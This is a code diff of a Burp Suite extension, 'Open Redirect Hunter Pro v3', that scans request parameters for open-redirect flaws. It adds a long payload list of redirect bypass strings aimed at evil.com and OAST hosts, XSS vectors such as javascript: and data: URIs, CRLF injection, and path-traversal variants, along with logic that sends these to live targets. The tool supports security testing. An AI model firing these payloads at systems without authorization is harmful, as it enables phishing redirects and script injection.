@@ -31,7 +31,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         self._helpers = callbacks.getHelpers()
         self._stdout = PrintWriter(callbacks.getStdout(), True)
         self._stderr = PrintWriter(callbacks.getStderr(), True)
-        self._callbacks.setExtensionName("Open Redirect Hunter Pro")
+        self._callbacks.setExtensionName("Open Redirect Hunter Pro v3")
 
         self.last_request_time = 0
         self.lock = threading.Lock()
@@ -39,39 +39,105 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         self.active_threads = []
         self.scanned_requests = set()
         
-        # Initialize whitelisted domains (domains we trust for redirects)
+        # Initialize whitelisted domains
         self.whitelisted_domains = self.load_setting("whitelisted_domains", [])
         
-        # Enhanced payloads with markers
+        # Enhanced payloads with all bypass techniques
         self.payloads = self.load_setting("payloads", [
-            "https://evil.com",
-            "http://evil.com", 
+            # @ bypass patterns
+            "@evil.com",
+            "@evil.com/",
+            "@evil.com%2f",
+            "@evil.com%2F",
+            "%40evil.com",
+            "%40evil.com%2f",
+            "%40evil.com%2F",
+            "@evil.com\\",
+            "@evil.com%5c",
+            
+            # Basic patterns
+            "evil.com",
+            "evil.com/",
+            "evil.com%2f",
+            "/evil.com",
             "//evil.com",
             "///evil.com",
             "////evil.com",
-            "\\\evil.com",
+            "\\evil.com",
             "\\\\evil.com",
+            "\\\evil.com",
             "/\\evil.com",
-            "https://evil.com%2f",
-            "https://evil.com%2f%2e%2e",
-            "https://evil.com#@target",
-            "https://evil.com?@target",
-            "https://evil.com@target",
-            "https://target@evil.com",
-            "https://evil.com%00",
-            "https://evil.com%0d%0a",
-            "//evil.com/%2f..",
-            "//evil.com/%2e%2e",
+            
+            # Protocol patterns
+            "https://evil.com",
+            "http://evil.com",
             "https:evil.com",
             "http:evil.com",
-            "evil.com",
-            "@evil.com",
+            "https:/evil.com",
+            "http:/evil.com",
+            
+            # Encoded patterns
+            "%2f%2fevil.com",
+            "%5c%5cevil.com",
+            "https%3A%2F%2Fevil.com",
+            "http%3A%2F%2Fevil.com",
+            
+            # Authority confusion
+            "https://google.com@evil.com",
+            "https://google.com%40evil.com",
+            "http://google.com@evil.com",
+            "//google.com@evil.com",
+            "https://evil.com@google.com",
+            "@google.com@evil.com",
+            
+            # Fragment/query bypass
+            "https://evil.com#",
+            "https://evil.com?",
+            "https://evil.com#@google.com",
+            "https://evil.com?@google.com",
+            
+            # Path traversal
+            "../evil.com",
+            "..;/evil.com",
+            "..%2fevil.com",
+            "..%252fevil.com",
+            
+            # Null byte
+            "https://evil.com%00",
+            "https://evil.com%0d%0a",
+            "evil.com%00.google.com",
+            
+            # XSS vectors
             "javascript:alert(1)",
-            "data:text/html,<script>alert(1)</script>"
+            "data:text/html,<script>alert(1)</script>",
+            "vbscript:alert(1)",
+            
+            # CRLF injection
+            "%0d%0aLocation:%20https://evil.com",
+            "\r\nLocation: https://evil.com",
+            
+            # OAST domains
+            "@oast.me",
+            "@oast.pro",
+            "@oast.live",
+            "//oast.me",
+            "https://oast.me",
+            "@interact.sh",
+            "//interact.sh"
         ])
         
-        # OAuth specific parameters that commonly have redirect functionality
-        self.oauth_params = ["redirect_uri", "return_url", "callback", "callback_url", "return_to"]
+        # Priority parameters to test
+        self.priority_params = [
+            "targetUrl", "targeturl", "target_url", "target", "url",
+            "redirect_uri", "redirect_url", "redirect", "redir",
+            "return_url", "return", "returnto", "return_to",
+            "callback", "callback_url", "next", "next_page",
+            "goto", "go", "dest", "destination", "continue",
+            "forward", "forward_url", "jump", "jump_to", "out",
+            "link", "linkurl", "domain", "uri", "path", "location",
+            "ref", "referer", "referrer", "view", "load", "fetch",
+            "service", "relay", "oauth_callback", "from", "to"
+        ]
         
         self.keywords = self.load_setting("keywords", 
             ["url", "redirect", "next", "target", "return", "dest", "goto", "link", "continue", "returnto", "redir", "redirect_uri", "callback"])
@@ -93,7 +159,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         if not request_responses:
             return None
 
-        menu_item = JMenuItem("Scan with Open Redirect Hunter Pro", 
+        menu_item = JMenuItem("Scan with Open Redirect Hunter Pro v3", 
                             actionPerformed=lambda e: self.manual_scan(request_responses[0]))
         menu.add(menu_item)
         return menu
@@ -151,11 +217,10 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         self.panel = JPanel(BorderLayout(10, 10))
         self.panel.setBorder(EmptyBorder(10, 10, 10, 10))
 
-        ## --- Settings Panel ---
         main_panel = JPanel()
         main_panel.setLayout(BoxLayout(main_panel, BoxLayout.Y_AXIS))
 
-        # === General Options ===
+        # General Options
         general_panel = JPanel(GridLayout(0, 1, 5, 5))
         general_panel.setBorder(TitledBorder("General Settings"))
 
@@ -176,7 +241,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
 
         main_panel.add(general_panel)
 
-        # === Payloads Section ===
+        # Payloads Section
         payload_panel = JPanel(BorderLayout())
         payload_panel.setBorder(TitledBorder("Redirect Payloads"))
 
@@ -190,7 +255,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         main_panel.add(Box.createVerticalStrut(10))
         main_panel.add(payload_panel)
         
-        # === Whitelist Section ===
+        # Whitelist Section
         whitelist_panel = JPanel(BorderLayout())
         whitelist_panel.setBorder(TitledBorder("Whitelisted Domains (one per line)"))
         
@@ -204,7 +269,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         main_panel.add(Box.createVerticalStrut(10))
         main_panel.add(whitelist_panel)
 
-        # === Keywords and Rate Limit ===
+        # Keywords and Rate Limit
         keyword_panel = JPanel(GridLayout(0, 2, 5, 5))
         keyword_panel.setBorder(TitledBorder("Filtering and Timing"))
 
@@ -219,14 +284,14 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         main_panel.add(Box.createVerticalStrut(10))
         main_panel.add(keyword_panel)
 
-        # === Save Button ===
+        # Save Button
         button_panel = JPanel(FlowLayout(FlowLayout.LEFT))
         self.save_button = JButton("Save Settings", actionPerformed=self.save_settings)
         button_panel.add(self.save_button)
         main_panel.add(Box.createVerticalStrut(10))
         main_panel.add(button_panel)
 
-        # === Status Label ===
+        # Status Label
         self.status_label = JLabel("Status: Ready", SwingConstants.LEFT)
         self.status_label.setBorder(EmptyBorder(5, 5, 5, 5))
         self.status_label.setFont(self.status_label.getFont().deriveFont(Font.BOLD))
@@ -235,7 +300,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
         self.panel.add(self.status_label, BorderLayout.SOUTH)
 
     def getTabCaption(self):
-        return "Open Redirect Hunter Pro"
+        return "Open Redirect Hunter Pro v3"
 
     def getUiComponent(self):
         return self.panel
@@ -246,7 +311,7 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
 
     def is_valid_open_redirect(self, location_header, payload, original_host):
         """
-        Enhanced validation to reduce false positives.
+        Enhanced validation to detect advanced open redirect bypasses.
         Returns (is_vulnerable, confidence, reason)
         """
         if not location_header:
@@ -259,91 +324,115 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
             self._stdout.println("[DEBUG] Checking location: %s" % location_header)
             self._stdout.println("[DEBUG] Against payload: %s" % payload)
         
-        # Extract the malicious domain from our payload
-        evil_domain = None
-        if "evil.com" in payload_lower:
-            evil_domain = "evil.com"
-        elif "oast.me" in payload_lower:
-            evil_domain = "oast.me"
-        elif "oast.pro" in payload_lower:
-            evil_domain = "oast.pro"
-        elif "oast.live" in payload_lower:
-            evil_domain = "oast.live"
-        elif "oast.online" in payload_lower:
-            evil_domain = "oast.online"
-        elif "oast.fun" in payload_lower:
-            evil_domain = "oast.fun"
-        elif "oast.site" in payload_lower:
-            evil_domain = "oast.site"
-        elif "burpcollaborator.net" in payload_lower:
-            evil_domain = "burpcollaborator.net"
-        elif "javascript:" in payload_lower:
-            evil_domain = "javascript"
-        elif "data:" in payload_lower:
-            evil_domain = "data"
-            
-        if not evil_domain:
-            return False, None, None
-            
-        # Parse the location header
+        # Decode both for comparison
         try:
-            parsed = urlparse(location_header)
-            
-            # Check if it's a javascript or data URI
-            if parsed.scheme in ['javascript', 'data']:
-                return True, "High", "XSS via %s URI scheme" % parsed.scheme
+            decoded_location = unquote(location_header)
+            decoded_payload = unquote(payload)
+        except:
+            decoded_location = location_header
+            decoded_payload = payload
+        
+        # Extract malicious domains
+        evil_domains = ["evil.com", "oast.me", "oast.pro", "oast.live", 
+                       "oast.online", "oast.fun", "oast.site", "burpcollaborator.net",
+                       "interact.sh", "oastify.com", "canarytokens.com"]
+        
+        # Special URI schemes
+        if location_lower.startswith(("javascript:", "data:", "vbscript:", "file:", "jar:")):
+            return True, "High", "XSS/LFI via %s URI scheme" % location_lower.split(':')[0]
+        
+        # CRITICAL: Check if location exactly matches our payload or is empty redirect
+        if location_header == payload or decoded_location == decoded_payload:
+            # Check if it contains any evil domain or bypass pattern
+            for evil_domain in evil_domains:
+                if evil_domain in decoded_location.lower():
+                    return True, "High", "Direct payload reflection with evil domain"
+            # Check for @ bypass patterns even without evil domain
+            if "@" in decoded_location and not decoded_location.startswith("mailto:"):
+                return True, "High", "Direct @ bypass pattern reflected"
                 
-            # Get the redirect domain
-            redirect_host = parsed.hostname if parsed.hostname else ""
+        # Empty value that becomes our payload
+        if location_header in ["", "/"]:
+            if "@" in payload_lower or any(evil in payload_lower for evil in evil_domains):
+                return True, "High", "Empty redirect populated with payload"
+        
+        # Check various bypass patterns
+        for evil_domain in evil_domains:
+            # @ prefix patterns (like @evil.com)
+            patterns_to_check = [
+                "@" + evil_domain,
+                "%40" + evil_domain,
+                "\\@" + evil_domain,
+                "@" + evil_domain + "/",
+                "@" + evil_domain + "\\",
+                "@" + evil_domain + "%2f",
+                "@" + evil_domain + "%5c",
+            ]
             
-            if self.debug_mode:
-                self._stdout.println("[DEBUG] Parsed redirect host: %s" % redirect_host)
+            for pattern in patterns_to_check:
+                if pattern in location_lower or pattern in decoded_location.lower():
+                    return True, "High", "@ bypass to evil domain: %s" % pattern
             
-            # Direct redirect to evil domain
-            if redirect_host and evil_domain in redirect_host.lower():
-                # Check if it's actually redirecting to evil domain or just contains it as parameter
-                if redirect_host.lower() == evil_domain or redirect_host.lower().endswith('.' + evil_domain):
-                    return True, "High", "Direct redirect to malicious domain: %s" % redirect_host
-                    
-            # Protocol-relative redirect
-            if location_header.startswith("//") and evil_domain in location_header:
-                parts = location_header[2:].split('/', 1)
-                if parts and evil_domain in parts[0].lower():
-                    return True, "High", "Protocol-relative redirect to: %s" % parts[0]
-                    
-            # Check for bypass techniques
-            if location_header.startswith("///") or location_header.startswith("\\\\"):
-                if evil_domain in location_header:
-                    return True, "Medium", "Multiple slash bypass technique"
-                    
-            # Check if the payload appears at the beginning (potential open redirect)
-            if location_header.startswith(payload) or location_header.startswith("//" + evil_domain):
-                return True, "High", "Location starts with malicious payload"
+            # Check if location starts with evil domain (various formats)
+            if location_lower.startswith((evil_domain, "//" + evil_domain, 
+                                         "///" + evil_domain, "\\\\" + evil_domain)):
+                return True, "High", "Direct redirect to: %s" % evil_domain
                 
-            # Check for @ bypass technique  
-            if "@" in location_header and evil_domain in location_header:
-                # Check if evil domain comes after @ (which would make it the real destination)
-                at_index = location_header.find("@")
-                evil_index = location_header.find(evil_domain)
-                if evil_index > at_index:
-                    return True, "High", "@ bypass technique detected"
+            # Authority confusion patterns
+            if "@" + evil_domain in location_lower:
+                # Ensure it's not just in a query parameter
+                if "?" in location_header:
+                    base_part = location_header.split("?")[0]
+                    if "@" + evil_domain in base_part.lower():
+                        return True, "High", "@ authority bypass in URL path"
+                else:
+                    return True, "High", "@ authority bypass detected"
                     
-            # In strict mode, require the evil domain to be the primary destination
-            if self.strict_mode:
-                # If evil domain only appears as a parameter value, it's likely false positive
-                if "?" in location_header or "&" in location_header:
-                    # Parse query parameters
-                    if "?" in location_header:
-                        query_part = location_header.split("?", 1)[1]
-                        if evil_domain in query_part and redirect_host != evil_domain:
-                            # Evil domain is just in parameters, not the main destination
-                            if self.debug_mode:
-                                self._stdout.println("[DEBUG] Evil domain found only in parameters, not main destination")
-                            return False, None, None
-                            
-        except Exception as e:
-            self._stderr.println("[!] Error parsing location: %s" % str(e))
+            # Backslash patterns
+            if "\\" in location_header and evil_domain in location_lower:
+                return True, "Medium", "Backslash bypass with evil domain"
+                
+            # Multiple slashes
+            if ("///" in location_header or "////" in location_header) and evil_domain in location_lower:
+                return True, "Medium", "Multiple slash bypass"
+                
+            # Encoded patterns
+            encoded_patterns = [
+                "%2f%2f" + evil_domain,
+                evil_domain + "%2f%2e%2e",
+                evil_domain + "%252f",
+                "%5c%5c" + evil_domain,
+            ]
             
+            for pattern in encoded_patterns:
+                if pattern in location_lower:
+                    return True, "Medium", "Encoded bypass pattern: %s" % pattern
+                    
+            # Check for partial domain injection
+            if evil_domain in location_lower:
+                # Parse to check if it's the actual host
+                try:
+                    parsed = urlparse(location_header)
+                    if parsed.hostname and evil_domain in parsed.hostname.lower():
+                        return True, "High", "Evil domain in hostname: %s" % parsed.hostname
+                except:
+                    pass
+                    
+        # Check for open redirect to any external domain (not just evil domains)
+        if self.strict_mode == False:
+            try:
+                parsed = urlparse(location_header)
+                if parsed.hostname and parsed.hostname.lower() != original_host.lower():
+                    # Check if it's not a relative redirect
+                    if not location_header.startswith("/") or "//" in location_header[:3]:
+                        # Potential open redirect to external site
+                        if "@" in location_header:
+                            return True, "Medium", "Potential @ bypass to external domain"
+                        if location_header.startswith("//"):
+                            return True, "Medium", "Protocol-relative redirect to external domain"
+            except:
+                pass
+                
         return False, None, None
 
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
@@ -448,68 +537,164 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
                 body = request_bytes[body_offset:]
                 query = body.decode('utf-8', errors='ignore')
 
-            # Update status with full URL instead of just path
+            # Update status with full URL
             self.update_status("Scanning: %s" % orig_url)
 
-            # Extract parameters
+            # Extract parameters - INCLUDING EMPTY ONES
             params = {}
+            empty_params = []
+            
             if query:
                 for param in query.split('&'):
-                    key, sep, val = param.partition('=')
-                    if key:
-                        # URL decode the parameter value
-                        try:
-                            val = unquote(val)
-                        except:
-                            pass
+                    if '=' in param:
+                        key, val = param.split('=', 1)
                         params[key] = val
+                        # Track if parameter is empty or has suspicious empty-like values
+                        if val in ['', '/', '//', 'http://', 'https://', 'http:', 'https:', '#', '?']:
+                            empty_params.append(key)
+                            self._stdout.println("[*] Found empty/suspicious parameter: %s=%s" % (key, val))
+                    else:
+                        # Parameter without value
+                        params[param] = ''
+                        empty_params.append(param)
 
             if self.debug_mode:
                 self._stdout.println("[DEBUG] Found parameters: %s" % params.keys())
+                if empty_params:
+                    self._stdout.println("[DEBUG] Empty/suspicious parameters: %s" % empty_params)
 
-            # Track if vulnerability was found to stop early
+            # Track if vulnerability was found
             vulnerability_found = False
+            tested_params = set()
             
-            # Check for OAuth redirect_uri specifically
-            for oauth_param in self.oauth_params:
+            # First test empty/suspicious parameters with ALL payloads
+            for param_key in empty_params:
                 if vulnerability_found:
                     break
+                if param_key in tested_params:
+                    continue
                     
-                if oauth_param in params:
-                    self._stdout.println("[*] Found OAuth parameter '%s' with value: %s" % (oauth_param, params[oauth_param]))
-                    
-                    # Update status for OAuth testing
-                    self.update_status("Testing OAuth param '%s' on %s" % (oauth_param, base_url.getHost()))
-                    
-                    # For OAuth redirect_uri, test if it accepts arbitrary domains
-                    current_value = params[oauth_param]
-                    
-                    # Only test if current value looks like a URL
-                    if current_value and ('http' in current_value.lower() or '//' in current_value):
-                        self._stdout.println("[*] Testing OAuth redirect parameter: %s" % oauth_param)
+                tested_params.add(param_key)
+                self._stdout.println("[!] Testing EMPTY parameter '%s' with ALL payloads" % param_key)
+                self.update_status("Testing empty param '%s' with %d payloads on %s" % (param_key, len(self.payloads), base_url.getHost()))
+                
+                payload_count = 0
+                for test_payload in self.payloads:
+                    if vulnerability_found:
+                        break
                         
-                        # Test with evil domains
-                        test_payloads = [
-                            "https://evil.com",
-                            "https://oast.me", 
-                            "//evil.com",
-                            "https://evil.com@" + original_host
-                        ]
+                    payload_count += 1
+                    if payload_count % 10 == 0:
+                        self.update_status("Testing payload %d/%d for '%s'" % (payload_count, len(self.payloads), param_key))
                         
-                        for test_payload in test_payloads:
+                    new_params = params.copy()
+                    new_params[param_key] = test_payload
+                    
+                    # Build request - preserve encoding for already encoded payloads
+                    param_list = []
+                    for k, v in new_params.items():
+                        if k == param_key:
+                            # For the parameter we're testing, use the payload as-is if it contains encoding
+                            if '%' in test_payload or '\\' in test_payload:
+                                param_list.append("%s=%s" % (k, v))
+                            else:
+                                param_list.append("%s=%s" % (k, quote(str(v), safe='')))
+                        else:
+                            # For other params, preserve original values
+                            if v:
+                                param_list.append("%s=%s" % (k, v))
+                            else:
+                                param_list.append(k + "=")
+                    
+                    new_query = "&".join(param_list)
+                    url_base = orig_url.split('?')[0]
+                    new_url_str = url_base + "?" + new_query
+                    
+                    if self.debug_mode and payload_count <= 5:
+                        self._stdout.println("[DEBUG] Testing with payload %d: %s" % (payload_count, test_payload))
+                    
+                    try:
+                        request = self._helpers.buildHttpRequest(URL(new_url_str))
+                        http_service = messageInfo.getHttpService()
+                        response = self._callbacks.makeHttpRequest(http_service, request)
+                        
+                        if response and response.getResponse():
+                            analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
+                            
+                            # Check for Location header
+                            for header in analyzed_resp.getHeaders():
+                                if header.lower().startswith("location:"):
+                                    location = header.split(":", 1)[1].strip()
+                                    
+                                    if self.debug_mode and payload_count <= 5:
+                                        self._stdout.println("[DEBUG] Got location: %s" % location)
+                                    
+                                    is_vuln, confidence, reason = self.is_valid_open_redirect(
+                                        location, test_payload, original_host
+                                    )
+                                    
+                                    if is_vuln:
+                                        self._stdout.println("[+] OPEN REDIRECT FOUND!")
+                                        self._stdout.println("    Parameter: %s" % param_key)
+                                        self._stdout.println("    Payload: %s" % test_payload)
+                                        self._stdout.println("    Location: %s" % location)
+                                        self._stdout.println("    Confidence: %s" % confidence)
+                                        self.report_redirect(http_service, new_url_str, response, 
+                                                          test_payload, location, confidence, 
+                                                          "Empty parameter exploit: " + param_key + " - " + reason)
+                                        vulnerability_found = True
+                                        self.update_status("VULNERABLE: Open redirect in '%s' on %s" % (param_key, base_url.getHost()))
+                                        break
+                    except Exception as e:
+                        if self.debug_mode:
+                            self._stderr.println("[DEBUG] Error testing payload %d: %s" % (payload_count, str(e)))
+                
+                if not vulnerability_found:
+                    self._stdout.println("[-] Tested %d payloads for '%s' - no vulnerability found" % (payload_count, param_key))
+            
+            # Test priority parameters if no vuln found yet
+            if not vulnerability_found:
+                for key in params:
+                    if vulnerability_found:
+                        break
+                    if key in tested_params:
+                        continue
+                        
+                    # Check if it's a priority parameter
+                    if key.lower() in [p.lower() for p in self.priority_params]:
+                        tested_params.add(key)
+                        self._stdout.println("[*] Testing priority parameter '%s' with ALL payloads" % key)
+                        self.update_status("Testing priority param '%s' with %d payloads" % (key, len(self.payloads)))
+                        
+                        payload_count = 0
+                        for test_payload in self.payloads:
                             if vulnerability_found:
                                 break
                                 
+                            payload_count += 1
+                            if payload_count % 10 == 0:
+                                self.update_status("Testing payload %d/%d for '%s'" % (payload_count, len(self.payloads), key))
+                                
                             new_params = params.copy()
-                            new_params[oauth_param] = test_payload
+                            new_params[key] = test_payload
                             
-                            # Rebuild the request
-                            new_query = "&".join("%s=%s" % (k, quote(str(v), safe='')) for k, v in new_params.items())
+                            # Build query with proper encoding
+                            param_list = []
+                            for k, v in new_params.items():
+                                if k == key:
+                                    if '%' in test_payload or '\\' in test_payload:
+                                        param_list.append("%s=%s" % (k, v))
+                                    else:
+                                        param_list.append("%s=%s" % (k, quote(str(v), safe='')))
+                                else:
+                                    if v:
+                                        param_list.append("%s=%s" % (k, v))
+                                    else:
+                                        param_list.append(k + "=")
+                            
+                            new_query = "&".join(param_list)
                             url_base = orig_url.split('?')[0]
                             new_url_str = url_base + "?" + new_query
-                            
-                            if self.debug_mode:
-                                self._stdout.println("[DEBUG] Testing URL: %s" % new_url_str)
                             
                             try:
                                 request = self._helpers.buildHttpRequest(URL(new_url_str))
@@ -519,134 +704,34 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):
                                 if response and response.getResponse():
                                     analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                                     
-                                    # Check for Location header
                                     for header in analyzed_resp.getHeaders():
                                         if header.lower().startswith("location:"):
                                             location = header.split(":", 1)[1].strip()
                                             
-                                            if self.debug_mode:
-                                                self._stdout.println("[DEBUG] Got location header: %s" % location)
-                                            
-                                            # Check if our payload domain appears in the location
                                             is_vuln, confidence, reason = self.is_valid_open_redirect(
                                                 location, test_payload, original_host
                                             )
                                             
                                             if is_vuln:
-                                                self._stdout.println("[+] OAuth Open Redirect FOUND!")
+                                                self._stdout.println("[+] OPEN REDIRECT FOUND!")
+                                                self._stdout.println("    Parameter: %s" % key)
+                                                self._stdout.println("    Payload: %s" % test_payload)
+                                                self._stdout.println("    Location: %s" % location)
                                                 self.report_redirect(http_service, new_url_str, response, 
-                                                                test_payload, location, confidence, 
-                                                                "OAuth parameter: " + oauth_param + " - " + reason)
+                                                                  test_payload, location, confidence, reason)
                                                 vulnerability_found = True
-                                                self.update_status("VULNERABLE: Open redirect found in '%s' on %s" % (oauth_param, base_url.getHost()))
+                                                self.update_status("VULNERABLE: Open redirect in '%s' on %s" % (key, base_url.getHost()))
                                                 break
                             except Exception as e:
                                 if self.debug_mode:
-                                    self._stderr.println("[DEBUG] Error testing OAuth param: %s" % str(e))
-
-            # Scan other parameters only if no vulnerability found yet
-            if not vulnerability_found:
-                for key in params:
-                    if vulnerability_found:
-                        break
+                                    self._stderr.println("[DEBUG] Error: %s" % str(e))
                         
-                    if not self.scan_all_checkbox.isSelected():
-                        if not any(word in key.lower() for word in self.keywords):
-                            continue
-
-                    self._stdout.println("[*] Testing parameter: %s" % key)
-                    
-                    # Update status for parameter testing
-                    self.update_status("Testing param '%s' on %s" % (key, base_url.getHost()))
-                    
-                    tested_count = 0
-                    for payload in self.payloads:
-                        if vulnerability_found:
-                            break
-                            
-                        if tested_count >= 5:  # Limit tests per parameter to avoid getting stuck
-                            break
-                            
-                        new_params = params.copy()
-                        new_params[key] = payload
-                        
-                        try:
-                            new_query = "&".join("%s=%s" % (k, quote(str(v), safe='')) for k, v in new_params.items())
-                        except Exception as e:
-                            self._stderr.println("[!] Error encoding parameters: %s" % str(e))
-                            continue
-                        
-                        url_base = orig_url.split('?')[0]
-                        new_url_str = url_base + "?" + new_query if param_source == "query" else url_base
-
-                        if param_source == "body":
-                            request = self._helpers.buildHttpMessage(headers, new_query)
-                        else:
-                            try:
-                                request = self._helpers.buildHttpRequest(URL(new_url_str))
-                            except Exception as e:
-                                self._stderr.println("[!] Error building request: %s" % str(e))
-                                continue
-
-                        http_service = messageInfo.getHttpService()
-                        
-                        try:
-                            response = self._callbacks.makeHttpRequest(http_service, request)
-                            
-                            if response and response.getResponse():
-                                analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
-
-                                location_header = None
-                                for header in analyzed_resp.getHeaders():
-                                    if header.lower().startswith("location:"):
-                                        location_header = header.split(":", 1)[1].strip()
-                                        break
-
-                                if location_header:
-                                    # Enhanced validation
-                                    is_vuln, confidence, reason = self.is_valid_open_redirect(
-                                        location_header, payload, original_host
-                                    )
-                                    
-                                    if is_vuln:
-                                        # Check if redirect domain is whitelisted
-                                        is_whitelisted = False
-                                        for domain in self.whitelisted_domains:
-                                            if domain and domain in location_header.lower():
-                                                is_whitelisted = True
-                                                self._stdout.println("[-] Skipping whitelisted domain: %s" % domain)
-                                                break
-                                                
-                                        if not is_whitelisted:
-                                            self._stdout.println("[+] VALID Open Redirect found!")
-                                            self._stdout.println("    Parameter: %s" % key)
-                                            self._stdout.println("    Payload: %s" % payload)
-                                            self._stdout.println("    Redirects to: %s" % location_header)
-                                            self._stdout.println("    Confidence: %s" % confidence)
-                                            self._stdout.println("    Reason: %s" % reason)
-                                            
-                                            # Report the issue
-                                            self.report_redirect(http_service, new_url_str, response, 
-                                                            payload, location_header, confidence, reason)
-                                            
-                                            vulnerability_found = True
-                                            self.update_status("VULNERABLE: Open redirect found in '%s' on %s" % (key, base_url.getHost()))
-                                            break
-                                    else:
-                                        # Log false positive that was filtered
-                                        if self.debug_mode and any(d in location_header.lower() for d in ["evil.com", "oast.me", "oast.pro"]):
-                                            self._stdout.println("[-] Filtered potential false positive:")
-                                            self._stdout.println("    Location: %s" % location_header)
-                        
-                        except Exception as e:
-                            if self.debug_mode:
-                                self._stderr.println("[DEBUG] Request failed: %s" % str(e))
-                        
-                        tested_count += 1
-
+                        if not vulnerability_found:
+                            self._stdout.println("[-] Tested %d payloads for '%s' - no vulnerability found" % (payload_count, key))
+            
             if vulnerability_found:
                 self.update_status("VULNERABLE: Open redirect found on %s" % base_url.getHost())
-                self._stdout.println("[!] Stopped scanning %s - vulnerability found" % orig_url)
+                self._stdout.println("[!] Stopped scanning - vulnerability found")
             else:
                 self.update_status("Scan complete for %s: no open redirects found" % base_url.getHost())
 
